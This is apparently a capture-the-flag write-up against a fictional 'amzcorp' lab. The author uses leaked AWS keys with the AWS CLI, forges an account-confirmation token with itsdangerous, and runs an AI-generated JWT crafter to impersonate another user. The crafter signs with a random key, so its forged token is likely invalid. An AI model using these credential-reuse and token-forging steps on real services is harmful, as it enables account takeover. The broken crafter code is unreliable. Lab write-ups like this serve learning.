Now the last flag we found in the DB we noticed that we got what i guess is AWS keys that we might be able to use to gain access to the cloud via CLI?

```
<td style="margin-top: 20px;padding-top: 20px;" class="text-center">AWS_ACCESS_KEY_ID,AWS_SECRET_ACCESS_KEY,FLAG</td>
                  <td style="margin-top: 20px;padding-top: 20px;" class="text-center">AKIA3G38BCN8SCJORKFL,GMTENUBiGygBeyOc+GpXsOfbQFfa3GGvpvb1fAjf,AWS{MySqL_T1m3_B453d_1nJ3c71on5_4_7h3_w1N}
```

I think my theory should be right as none of the other sites can be logged in via my Account that is now Admin or via Tyler's account.. Plus we foud 3 flags under Jobs website, I feel we can move on now to other horizons.

Now we can configure the AWS cli:

```
└─# aws configure
AWS Access Key ID [None]: AKIA3G38BCN8SCJORKFL
AWS Secret Access Key [None]: GMTENUBiGygBeyOc+GpXsOfbQFfa3GGvpvb1fAjf
Default region name [None]: 
Default output format [None]: json
```

We can see that we saved the default credentials.

![b505d115ef268a3b9ece2b3153d1ec88.png](../../../_resources/b505d115ef268a3b9ece2b3153d1ec88.png)

Now I think we need to find a way to tell to the back-end we must connect to **http://cloud.amzcorp.local** and not actualy the default AWS endpoint... 

![36cbad72f774356984bf3318a141f2ae.png](../../../_resources/36cbad72f774356984bf3318a141f2ae.png)

Indeed it is not working but if we choose the other endpoint we can pass the error and move to another where actually it asks you to choose a right region(this is quite important as you can have resources in different regions...)

```
aws account list-regions --endpoint-url http://cloud.amzcorp.local

You must specify a region. You can also configure your region by running "aws configure".
```

Now I am guessing that the resources should be located in UK? if so we should test these ones...

![5f4e17947599f8140d8f551722610de1.png](../../../_resources/5f4e17947599f8140d8f551722610de1.png)

And now it should stop complaining right?

```
┌──(root㉿kali-bello)-[~/.aws]
└─# aws configure list
      Name                    Value             Type    Location
      ----                    -----             ----    --------
   profile                <not set>             None    None
access_key     ****************RKFL shared-credentials-file    
secret_key     ****************fAjf shared-credentials-file    
    region                eu-west-1      config-file    ~/.aws/config
```

![0006dba769b2512c6289046103bedc5e.png](../../../_resources/0006dba769b2512c6289046103bedc5e.png)

Ok the issue now is most likely caused by permissions so far, let's see what other can we do? If we check the account endpoint we can see that we are using the AWS keys for the user Roy?

```
aws account list-regions

An error occurred (403) when calling the ListRegions operation: User arn:aws:iam::000000000000:user/roy is not authorized to perform this action
```

# Enumerating the cloud

Here I asked AI to give me some command how can I enumerate and we can ask the STS in order to see what is our user ARN and so on, this will help you so you can use it to target specific polcies.

```
aws sts get-caller-identity
{
    "UserId": "AKIAD04C7G3J9F8G8320",
    "Account": "000000000000",
    "Arn": "arn:aws:iam::000000000000:user/roy"
}
```

Here I might have been wrong, I checked for tips again and seems like we have another website to check before the cloud as the Roy account seems not having permissions to do anything so far and without having the ability to enumerate the AWS IAM policies it's done!

# Back on Dev site

I remember when I dumped the git repository from the **devjobs** site the dumper dumped the code of the support site as well. That is where I have to concentrate myself so far!

And again getting the app.js we can deobjuscate from JSFuck and get the following code from the support portal site.

```
"use strict";
const d = document;
d.addEventListener("DOMContentLoaded", function(event) {

    const swalWithBootstrapButtons = Swal.mixin({
        customClass: {
            confirmButton: 'btn btn-primary me-3',
            cancelButton: 'btn btn-gray'
        },
        buttonsStyling: false
    });

    var themeSettingsEl = document.getElementById('theme-settings');
    var themeSettingsExpandEl = document.getElementById('theme-settings-expand');

    if(themeSettingsEl) {

        var themeSettingsCollapse = new bootstrap.Collapse(themeSettingsEl, {
            show: true,
            toggle: false
        });

        if (window.localStorage.getItem('settings_expanded') === 'true') {
            themeSettingsCollapse.show();
            themeSettingsExpandEl.classList.remove('show');
        } else {
            themeSettingsCollapse.hide();
            themeSettingsExpandEl.classList.add('show');
        }
        
        themeSettingsEl.addEventListener('hidden.bs.collapse', function () {
            themeSettingsExpandEl.classList.add('show');
            window.localStorage.setItem('settings_expanded', false);
        });

        themeSettingsExpandEl.addEventListener('click', function () {
            themeSettingsExpandEl.classList.remove('show');
            window.localStorage.setItem('settings_expanded', true);
            setTimeout(function() {
                themeSettingsCollapse.show();
            }, 300);
        });
    }

    // options
    const breakpoints = {
        sm: 540,
        md: 720,
        lg: 960,
        xl: 1140
    };

    var sidebar = document.getElementById('sidebarMenu')
    if(sidebar && d.body.clientWidth < breakpoints.lg) {
        sidebar.addEventListener('shown.bs.collapse', function () {
            document.querySelector('body').style.position = 'fixed';
        });
        sidebar.addEventListener('hidden.bs.collapse', function () {
            document.querySelector('body').style.position = 'relative';
        });
    }

    var iconNotifications = d.querySelector('.notification-bell');
    if (iconNotifications) {
        iconNotifications.addEventListener('shown.bs.dropdown', function () {
            iconNotifications.classList.remove('unread');
        });
    }

    [].slice.call(d.querySelectorAll('[data-background]')).map(function(el) {
        el.style.background = 'url(' + el.getAttribute('data-background') + ')';
    });

    [].slice.call(d.querySelectorAll('[data-background-lg]')).map(function(el) {
        if(document.body.clientWidth > breakpoints.lg) {
            el.style.background = 'url(' + el.getAttribute('data-background-lg') + ')';
        }
    });

    [].slice.call(d.querySelectorAll('[data-background-color]')).map(function(el) {
        el.style.background = 'url(' + el.getAttribute('data-background-color') + ')';
    });

    [].slice.call(d.querySelectorAll('[data-color]')).map(function(el) {
        el.style.color = 'url(' + el.getAttribute('data-color') + ')';
    });

    //Tooltips
    var tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'))
    var tooltipList = tooltipTriggerList.map(function (tooltipTriggerEl) {
    return new bootstrap.Tooltip(tooltipTriggerEl)
    })


    // Popovers
    var popoverTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="popover"]'))
    var popoverList = popoverTriggerList.map(function (popoverTriggerEl) {
      return new bootstrap.Popover(popoverTriggerEl)
    })
    

    // Datepicker
    var datepickers = [].slice.call(d.querySelectorAll('[data-datepicker]'))
    var datepickersList = datepickers.map(function (el) {
        return new Datepicker(el, {
            buttonClass: 'btn'
          });
    })

    if(d.querySelector('.input-slider-container')) {
        [].slice.call(d.querySelectorAll('.input-slider-container')).map(function(el) {
            var slider = el.querySelector(':scope .input-slider');
            var sliderId = slider.getAttribute('id');
            var minValue = slider.getAttribute('data-range-value-min');
            var maxValue = slider.getAttribute('data-range-value-max');

            var sliderValue = el.querySelector(':scope .range-slider-value');
            var sliderValueId = sliderValue.getAttribute('id');
            var startValue = sliderValue.getAttribute('data-range-value-low');

            var c = d.getElementById(sliderId),
                id = d.getElementById(sliderValueId);

            noUiSlider.create(c, {
                start: [parseInt(startValue)],
                connect: [true, false],
                //step: 1000,
                range: {
                    'min': [parseInt(minValue)],
                    'max': [parseInt(maxValue)]
                }
            });
        });
    }

    if (d.getElementById('input-slider-range')) {
        var c = d.getElementById("input-slider-range"),
            low = d.getElementById("input-slider-range-value-low"),
            e = d.getElementById("input-slider-range-value-high"),
            f = [d, e];

        noUiSlider.create(c, {
            start: [parseInt(low.getAttribute('data-range-value-low')), parseInt(e.getAttribute('data-range-value-high'))],
            connect: !0,
            tooltips: true,
            range: {
                min: parseInt(c.getAttribute('data-range-value-min')),
                max: parseInt(c.getAttribute('data-range-value-max'))
            }
        }), c.noUiSlider.on("update", function (a, b) {
            f[b].textContent = a[b]
        });
    }

    //Chartist

    if(d.querySelector('.ct-chart-sales-value')) {
        //Chart 5
          new Chartist.Line('.ct-chart-sales-value', {
            labels: ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun'],
            series: [
                [0, 10, 30, 40, 80, 60, 100]
            ]
          }, {
            low: 0,
            showArea: true,
            fullWidth: true,
            plugins: [
              Chartist.plugins.tooltip()
            ],
            axisX: {
                // On the x-axis start means top and end means bottom
                position: 'end',
                showGrid: true
            },
            axisY: {
                // On the y-axis start means left and end means right
                showGrid: false,
                showLabel: false,
                labelInterpolationFnc: function(value) {
                    return '$' + (value / 1) + 'k';
                }
            }
        });
    }

    if(d.querySelector('.ct-chart-ranking')) {
        var chart = new Chartist.Bar('.ct-chart-ranking', {
            labels: ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'],
            series: [
              [1, 5, 2, 5, 4, 3],
              [2, 3, 4, 8, 1, 2],
            ]
          }, {
            low: 0,
            showArea: true,
            plugins: [
              Chartist.plugins.tooltip()
            ],
            axisX: {
                // On the x-axis start means top and end means bottom
                position: 'end'
            },
            axisY: {
                // On the y-axis start means left and end means right
                showGrid: false,
                showLabel: false,
                offset: 0
            }
            });
          
          chart.on('draw', function(data) {
            if(data.type === 'line' || data.type === 'area') {
              data.element.animate({
                d: {
                  begin: 2000 * data.index,
                  dur: 2000,
                  from: data.path.clone().scale(1, 0).translate(0, data.chartRect.height()).stringify(),
                  to: data.path.clone().stringify(),
                  easing: Chartist.Svg.Easing.easeOutQuint
                }
              });
            }
        });
    }

    if(d.querySelector('.ct-chart-traffic-share')) {
        var data = {
            series: [70, 20, 10]
          };
          
          var sum = function(a, b) { return a + b };
          
          new Chartist.Pie('.ct-chart-traffic-share', data, {
            labelInterpolationFnc: function(value) {
              return Math.round(value / data.series.reduce(sum) * 100) + '%';
            },            
            low: 0,
            high: 8,
            donut: true,
            donutWidth: 20,
            donutSolid: true,
            fullWidth: false,
            showLabel: false,
            plugins: [
              Chartist.plugins.tooltip()
            ],
        });         
    }

    if (d.getElementById('loadOnClick')) {
        d.getElementById('loadOnClick').addEventListener('click', function () {
            var button = this;
            var loadContent = d.getElementById('extraContent');
            var allLoaded = d.getElementById('allLoadedText');
    
            button.classList.add('btn-loading');
            button.setAttribute('disabled', 'true');
    
            setTimeout(function () {
                loadContent.style.display = 'block';
                button.style.display = 'none';
                allLoaded.style.display = 'block';
            }, 1500);
        });
    }

    var scroll = new SmoothScroll('a[href*="#"]', {
        speed: 500,
        speedAsDuration: true
    });

    if(d.querySelector('.current-year')){
        d.querySelector('.current-year').textContent = new Date().getFullYear();
    }

    // Glide JS

    if (d.querySelector('.glide')) {
        new Glide('.glide', {
            type: 'carousel',
            startAt: 0,
            perView: 3
          }).mount();
    }

    if (d.querySelector('.glide-testimonials')) {
        new Glide('.glide-testimonials', {
            type: 'carousel',
            startAt: 0,
            perView: 1,
            autoplay: 2000
          }).mount();
    }

    if (d.querySelector('.glide-clients')) {
        new Glide('.glide-clients', {
            type: 'carousel',
            startAt: 0,
            perView: 5,
            autoplay: 2000
          }).mount();
    }

    if (d.querySelector('.glide-news-widget')) {
        new Glide('.glide-news-widget', {
            type: 'carousel',
            startAt: 0,
            perView: 1,
            autoplay: 2000
          }).mount();
    }

    if (d.querySelector('.glide-autoplay')) {
        new Glide('.glide-autoplay', {
            type: 'carousel',
            startAt: 0,
            perView: 3,
            autoplay: 2000
          }).mount();
    }

    // Pricing countup
    var billingSwitchEl = d.getElementById('billingSwitch');
    if(billingSwitchEl) {
        const countUpStandard = new countUp.CountUp('priceStandard', 99, { startVal: 199 });
        const countUpPremium = new countUp.CountUp('pricePremium', 199, { startVal: 299 });
        
        billingSwitchEl.addEventListener('change', function() {
            if(billingSwitch.checked) {
                countUpStandard.start();
                countUpPremium.start();
            } else {
                countUpStandard.reset();
                countUpPremium.reset();
            }
        });
    }

});

SetDatePicker();

$(document).ready(function () {
    // Delete Item
    $('.item-row').on('click', '.delete_item', function (event) {
        event.preventDefault();
        var btn = $(this);
        var url = btn.data('href');
        var param = [];
        param['url'] = url;
        param['btn'] = btn;

        $.confirm({
                title: 'Warning!',
                content: 'Are you sure you want to delete?',
                type: 'red',
                buttons: {
                    yes: function () {
                        AjaxRemoveItem(param);
                    },
                    no: function () {
                    }
                }
            },
        );
    });

    // Edit Item by double click
    $('.item-row').dblclick(function (event) {
        event.preventDefault();
        var item = $(this);
        var url = item.data('edit');
        var param = [];
        param['url'] = url;
        param['item'] = item;
        AjaxGetEditRowForm(param);
    });

    // Save form with click button
    $('.item-row').on('click', '.save_form', function (event) {
        event.preventDefault();
        var btn = $(this);
        SaveItem(btn);
    });

    // Save form with ENTER
    $('.item-row').keyup('.value', function (event) {
        if (event.keyCode === 13) {
            event.preventDefault();
            var btn = $(this);
            SaveItem(btn);
        }
    });
    $('.item-row').keyup('.name', function (event) {
        if (event.keyCode === 13) {
            event.preventDefault();
            var btn = $(this);
            SaveItem(btn);
        }
    });

    // Cancel edit form
    $('.item-row').on('click', '.cancel_form', function (event) {
        event.preventDefault();
        var btn = $(this);
        var item = btn.closest('.item-row');
        var url = item.data('detail');
        var param = [];
        param['url'] = url;
        param['item'] = item;
        AjaxGetEditRowDetail(param);
    });
});


// Functions

function AjaxGetEditRowDetail(param) {
    $.ajax({
        url: param['url'],
        type: 'GET',
        success: function (data) {
            param['item'].html(data);
        },
        error: function () {
            notification.error('Error occurred');
        }
    });
}

function AjaxGetEditRowForm(param) {
    $.ajax({
        url: param['url'],
        type: 'GET',
        success: function (data) {
            param['item'].html(data);
            SetDatePicker();
        },
        error: function () {
            notification.error('Error occurred');
        }
    });
}

function AjaxPutEditRowForm(param) {
    $.ajax({
        url: param['url'],
        type: 'PUT',
        data: param['query'],
        beforeSend: function (xhr) {
            xhr.setRequestHeader("X-CSRFToken", $.cookie('csrftoken'));
        },
        success: function (data) {
            notification[data.valid](data.message);

            if (data.valid === 'success') {
                param['item'].html(data.edit_row);
                SetDatePicker();
            }
        },
        error: function () {
            toastr.error('Error occurred');
        }
    });
}

function AjaxRemoveItem(param) {
    $.ajax({
        url: param['url'],
        type: 'DELETE',
        data: param['query'],
        beforeSend: function (xhr) {
            xhr.setRequestHeader("X-CSRFToken", $.cookie('csrftoken'));
        },
        success: function (data) {
            if (data.valid !== 'success')
                notification[data.valid](data.message);

            if (data.valid === 'success') {
                if (data.redirect_url) {
                    window.location.replace(data.redirect_url);
                } else {
                    notification[data.valid](data.message);
                    var item_row = param['btn'].closest('.item-row');
                    item_row.hide('slow', function () {
                        item_row.remove();
                    });
                }
            }
        },
        error: function () {
            toastr.error('Error occurred');
        }
    });
}

function SaveItem(btn) {
    var item = btn.closest('.item-row');
    var url = item.data('edit');
    var param = [];
    param['url'] = url;
    param['item'] = item;
    param['query'] = $('.value').serialize() + '&' + $('.name').serialize() + '&' + $('.type').serialize();
    AjaxPutEditRowForm(param);
}

function SetDatePicker() {
    var datepickers = [].slice.call(d.querySelectorAll('.datepicker_input'));
    datepickers.map(function (el) {
        return new Datepicker(el, {format: 'yyyy-mm-dd'});
    });
}

function GenerateToken() {
    var generate_token= document.getElementById('generate_token');
    var api_token = document.getElementById('api_token');
    var output = document.getElementById('output');
    output.innerHTML = '';
    if (username.value == "") {
        output.innerHTML = "Username value cannot be empty!";
        setTimeout(() => {
               document.getElementById('closeAlert');
        }, 2000);
        return;
    }
    xhr.open('POST', '/api/v4/tokens/generate_token');
    xhr.responseType = 'json';
    xhr.onload = function(e) {
        if (this.status == 200) {
            api_token.append(this.response['token']);
        }
    };
    data = {"generate_token":generate_token}
    xhr.send(data);
}

function GetToken() {
    var uuid = document.getElementById('uuid');
    var username = document.getElementById('username');
    var api_token = document.getElementById('api_token');
    var output = document.getElementById('output');
    output.innerHTML = '';
    if (username.value == "") {
        output.innerHTML = "Username value cannot be empty!";
        setTimeout(() => {
               document.getElementById('closeAlert');
        }, 2000);
        return;
    }
    xhr.open('POST', '/api/v4/tokens/get');
    xhr.responseType = 'json';
    xhr.onload = function(e) {
        if (this.status == 200) {
            api_token.append(this.response['token']);
        }
    };
    data = btoa('{"get_token": "True", "uuid":' + uuid',"username":' + username + '}');
    xhr.send({"data":data});
}

function GetLogData() {
    var log_table = document.getElementById('log_table');
    const xhr = new XMLHttpRequest();
    /* Get log data from logs.amzcorp.local */
    xhr.open('GET', '/api/v4/logs/get_logs');
    xhr.responseType = 'json';
    xhr.onload = function(e) {
        if (this.status == 200) {
            log_table.append(this.response['log']);
        }
    };
    xhr.send();
}
```

The code looks pretty similar compared to the other one to me :D If we register a new account and login we can see that we are not authorized:

![1730186a8e2ce04cc1b85ed8a8f0bb53.png](../../../_resources/1730186a8e2ce04cc1b85ed8a8f0bb53.png)

But we can see that we obtained a JWT token:

![370ea2aa040f54fff429e05ae8f06a3d.png](../../../_resources/370ea2aa040f54fff429e05ae8f06a3d.png)

Now I guess that we need to change the status from false to true in order to gain access to the portal but as you see from the ALG, the token is encrypted so we need to find the enckey before attempting to tamper the JWT token, and I hope that can be found in the repository code.

![d5c970eb8632ee79989f27e36e60a50b.png](../../../_resources/d5c970eb8632ee79989f27e36e60a50b.png)

Ok I guess we can ask ChatGPT to help us if we can decrypt the singning key somehow? But I was wrong apparently we must confirm our account first, and this is the interested code(got another tips for this)..

```
@blueprint.route('/confirm_account/<secretstring>', methods=['GET', 'POST'])
def confirm_account(secretstring):
    s = URLSafeSerializer('serliaizer_code')
    username, email = s.loads(secretstring)

    user = Users.query.filter_by(username=username).first()
    user.account_status = True
    db.session.add(user)
    db.session.commit()

    #return redirect(url_for("authentication_blueprint.login", msg="Your account was confirmed succsessfully"))
    return render_template('accounts/login.html',
                        msg='Account confirmed successfully.',
                        form=LoginForm())
```

Now here I asked AI to explain me code and basically it accepts the GET/POST request to the confirmation account endpoint.

From here it deserializes a URL encoded string, and searchs for username/email and approves the account.

```
from itsdangerous import URLSafeSerializer

# Create a serializer with a secret key
secret_key = 'serializer_code'
serializer = URLSafeSerializer(secret_key)

# Data to be serialized
username = 'yovecio'
email = 'yovecio@test.htb'

# Serialize the data
secretstring = serializer.dumps([username, email])

print(f'Serialized string: {secretstring}')
```

And running the code we have what we need: 

```
python3 approver.py 
Serialized string: WyJ5b3ZlY2lvIiwieW92ZWNpb0B0ZXN0Lmh0YiJd.OidQkhOdmKm-Tz-GAxHPIAJk7J4
```

Now we can send the request to the endpoint via a normal GET request. Here I noticed that the ChatGPT used the wrong secret key:

```
s = URLSafeSerializer('serliaizer_code')
```

And now sending the message I am not getting any Internal error so far:

![c914a3262e18d7e8416c839b0a2bf817.png](../../../_resources/c914a3262e18d7e8416c839b0a2bf817.png)

And now we can finally get in!

![7f0c681accd168e38cc5af73494bb1cc.png](../../../_resources/7f0c681accd168e38cc5af73494bb1cc.png)

Now unfortunately on the website I don't see much more than being able to see tickets created by me. So I will check again if I can get somehow the list of users on the API? And then check the custom JWT function if I can craft my own token somehow and take over another user or just elevate me....

Now something I totally missed is an indication about another possible user?  
![447c43caae0c314e7511dd4d54ba6693.png](../../../_resources/447c43caae0c314e7511dd4d54ba6693.png)

Now we can use the AI to generate a decoder of the JWT and decrypt it so far:

```
└─# cat decoder.py                                                                                                                
import base64
import json

def unb64(data):
    """Decode base64, padding being optional."""
    data += '=' * (4 - len(data) % 4)
    return base64.urlsafe_b64decode(data)

def decode_jwt(jwt):
    _header, _data, _sig = jwt.split(".")
    data = json.loads(unb64(_data))
    return data

# Your JWT token
jwt_token = "eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6InlvdmVjaW8iLCJlbWFpbCI6InlvdmVjaW9AdGVzdC5odGIiLCJhY2NvdW50X3N0YXR1cyI6dHJ1ZX0.jh8mhNsfmJq735oAweteRXDvKE5pCqSrf6QEoT6IdFUJvWj32Oty8giVQEGz-gheyVzE_m6VYAc-anm8f-cn-g"

# Decode the JWT token
decoded_data = decode_jwt(jwt_token)
print(decoded_data)
```

And we should do same in order to create a new token for tony, where going by login his mail should be tony@amzcorp.local?

Copilot gave me this code:

```
import base64
from ecdsa import ellipticcurve
from ecdsa.ecdsa import curve_256, generator_256, Public_key, Private_key, Signature
from random import randint
from hashlib import sha256
from Crypto.Util.number import long_to_bytes, bytes_to_long
import json

# Backend code setup
G = generator_256
q = G.order()
k = randint(1, q - 1)
d = randint(1, q - 1)
pubkey = Public_key(G, G*d)
privkey = Private_key(pubkey, d)

def b64(data):
    return base64.urlsafe_b64encode(data).decode()

def unb64(data):
    l = len(data) % 4
    return base64.urlsafe_b64decode(data + "=" * (4 - l))

def sign(msg):
    msghash = sha256(msg.encode()).digest()
    sig = privkey.sign(bytes_to_long(msghash), k)
    _sig = (sig.r << 256) + sig.s
    return b64(long_to_bytes(_sig)).replace("=", "")

def verify(jwt):
    _header, _data, _sig = jwt.split(".")
    header = json.loads(unb64(_header))
    data = json.loads(unb64(_data))
    sig = bytes_to_long(unb64(_sig))
    signature = Signature(sig >> 256, sig % 2**256)
    msghash = bytes_to_long(sha256((f"{_header}.{_data}").encode()).digest())
    if pubkey.verifies(msghash, signature):
        return True
    return False

def decode_jwt(jwt):
    _header, _data, _sig = jwt.split(".")
    data = json.loads(unb64(_data))
    return data

def create_jwt(data):
    header = {"alg": "ES256"}
    _header = b64(json.dumps(header, separators=(',', ':')).encode())
    _data = b64(json.dumps(data, separators=(',', ':')).encode())
    _sig = sign(f"{_header}.{_data}".replace("=", ""))
    jwt = f"{_header}.{_data}.{_sig}"
    jwt = jwt.replace("=", "")
    return jwt

# Data to be included in the JWT
data = {
    'username': 'tony',
    'email': 'tony@amzcorp.local',
    'account_status': True
}

# Generate JWT
jwt_token = create_jwt(data)
print(f'Generated JWT: {jwt_token}')
```

&nbsp;And this is the result so far:

```
┌──(root㉿kali-bello)-[/home/millycash/Downloads/AWS/support_portal]
└─# python3 crafter.py 
Generated JWT: eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6InRvbnkiLCJlbWFpbCI6InRvbnlAYW16Y29ycC5sb2NhbCIsImFjY291bnRfc3RhdHVzIjp0cnVlfQ.gHRLXeFZMrmvZRehhSCgAblIHWH0o2B4nVRsra4wMckQ85dUou9-IVWMGn6-RXCfKLfHnw4OZeDfbMckGb3PPg
                                                                                                                                                                                   
┌──(root㉿kali-bello)-[/home/millycash/Downloads/AWS/support_portal]
└─# nano decoder.py   
                                                                                                                                                                                   
┌──(root㉿kali-bello)-[/home/millycash/Downloads/AWS/support_portal]
└─# python3 decoder.py 
{'username': 'tony', 'email': 'tony@amzcorp.local', 'account_status': True}
```

If this is true, by changing our token in the browser we should be able to login as him?

![a53b6e216fc4fd62e374c67e6c081efc.png](../../../_resources/a53b6e216fc4fd62e374c67e6c081efc.png)

Ok do I need to approve Tony again? Let's do it again!

![c1de7c80c1f85e952a2274e24c76902f.png](../../../_resources/c1de7c80c1f85e952a2274e24c76902f.png)

And the moment of thruth!

&nbsp;